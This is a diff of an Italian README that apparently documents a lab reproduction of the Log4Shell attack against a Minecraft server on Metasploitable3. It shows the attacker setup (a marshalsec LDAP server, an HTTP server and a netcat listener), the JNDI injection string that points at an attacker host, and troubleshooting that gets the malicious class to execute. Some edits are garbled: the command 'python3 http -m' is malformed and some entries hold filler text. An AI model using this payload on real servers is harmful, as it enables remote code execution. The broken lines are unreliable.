@@ -45,7 +45,7 @@ java -cp target/marshalsec-[VERSIONE]-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefSe
 ``` 
 **3)** Avvio del server http tramite:
 ```console
-python3 http
+python3 http -m
 ``` 
 **4)** Avvio del server netcat tramite:
 ```console
@@ -54,8 +54,7 @@ netcat -lnvp <porta>
 **A questo punto l'ambiente dell'attaccante è pronto, è ora possibile l'inizio della fase di iniezione.**
 
 **Nota:** Per l'iniezione non è necessario che sia sempre lo stesso attaccante/macchina ad eseguire questi passaggi, perciò per questioni di ottimizzazione e per non appesantire eccessivamente le macchine virtuali, l'iniezione verrà effettuata direttamente dalla macchina host, si è proceduto così all'apertura della porta 
-**255565**[(1)](#1-quasi-tutti-i-server-di-gioco-sono-impostati-con-la-porta-well-known-25565-se-non-diversamente-configurati-anche-nel-nostro-caso-si-è-proceduto-a-lasciare-la-porta-predefinita) 
-di VirtualBox per consentire all'host di raggiungere il server vittima.
+###### 25565[(1)](#1-quasi-tutti-i-server-di-gioco-sono-impostati-con-la-porta-well-known-25565-se-non-diversamente-configurati-anche-nel-nostro-caso-si-è-proceduto-a-lasciare-la-porta-predefinita) di VirtualBox per consentire all'host di raggiungere il server vittima.
 
 1) Download ed installazione di Java per poter avviare il gioco, a contrario del server vittima e dell'ambiente dell'attaccante, non è necessaria la versione specifica vulnerabile.
 
@@ -67,10 +66,15 @@ di VirtualBox per consentire all'host di raggiungere il server vittima.
  ```shell
  {jndi:ldap://<IP ATTACCANTE>:<PORTA LDAP ATTACCANTE>/#<NomeClasseJava>}
  ```
-### Altre criticità riscontrate e problemi noti
+### Problematiche riscontrate e criticità note
 Come anticipato il server in questione è stato direttamente hostato sulla macchina virtaule *Metasploitable3*, per cui il funzionamento dell'attacco e le relative criticità si riferiscono a questo ambiente.
 
-
+```markdown
+ 1. **Problematica:**  Inizialmente si è proceduto a compliare una classe Java per l'exploit utilizzando una versione predefinita installata nel sistema (nel nostro caso la versione "11.0"), tuttavia si è scoperto che l'exploit non andava a buon fine, interrompendo quindi l'attacco fino alla fase della connessione ed ottenimento da parte del server vittima della classe malevola.
+**Soluzione:** Si è scoperto che nella file batch creato sul server per eseguirlo, (quindi non sulla console diretta), compariva un errore segnalante che la classe era stata compilata con una versione successiva e di conseguenza non poteva essere eseguita. Si è così provato a compliare la classe direttamente con la stessa versione che il server è stato compilato (ossia la JDK 1.8.0_101) ed a seguito di ulteriori tentavi si è riusciuti a far eseguire la classe con successo.
+2.  **Problematica:** vvvvv
+**Soluzione:** avv
+```
 
 ---
-##### [(1)](#25565): Quasi tutti i server di gioco sono impostati con la porta "well-known" '25565', se non diversamente configurati, anche nel nostro caso si è proceduto a lasciare la porta predefinita.
+##### [(1)](#255651): Quasi tutti i server di gioco sono impostati con la porta "well-known" '25565', se non diversamente configurati, anche nel nostro caso si è proceduto a lasciare la porta predefinita.
